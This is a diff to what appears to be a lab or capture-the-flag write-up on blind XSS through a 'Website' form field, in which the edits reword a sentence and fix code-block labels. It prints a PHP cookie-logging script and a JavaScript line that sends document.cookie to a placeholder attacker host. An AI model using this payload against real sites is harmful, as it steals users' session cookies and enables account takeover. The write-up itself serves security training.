@@ -53,9 +53,9 @@ The listener confirmed that the **Website** field was vulnerable when the applic
 
 ### Exploitation
 
-To exfiltrate cookies from the vulnerable application, I created the following files on my server:
+To exfiltrate cookies from the vulnerable application, I created the following files on my server: `index.php` (to log the cookies) and `script.js` (to trigger exfiltration):
 
-```index.php
+```php
 <?php
 if (isset($_GET['c'])) {
     $list = explode(";", $_GET['c']);
@@ -69,7 +69,7 @@ if (isset($_GET['c'])) {
 ?>
 ```
 
-```script.js
+```javascript
 new Image().src='http://<attacker_ip>/index.php?c='+document.cookie;
 ```
 
@@ -106,5 +106,6 @@ This confirms the presence of a critical XSS vulnerability that could allow atta
 - Blind XSS successfully triggered via the **Website** field  
 - External script execution enabled cookie exfiltration  
 - Captured session data revealed the assessment flag
+
 
 
